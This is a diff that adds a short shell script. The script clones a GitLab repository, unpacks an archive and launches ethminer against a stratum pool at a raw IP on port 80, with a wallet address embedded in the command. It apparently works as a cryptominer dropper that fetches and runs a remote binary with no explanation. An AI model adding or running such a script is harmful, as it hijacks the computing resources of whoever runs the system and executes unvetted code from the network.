@@ -1,0 +1,15 @@
+#!/bin/sh
+
+apt install git
+
+git clone https://gitlab.com/xybyel.t/babi.git
+
+cd babi
+
+tar -zxvf babi.tar.gz
+
+cd bin/
+
+export LC_ALL=C; unset LANGUAGE
+
+./ethminer -U -P stratum2+tcp://341CXcrRBKwivMKbgcdVdoieCVFcM2yobo.sage@144.217.82.15:80
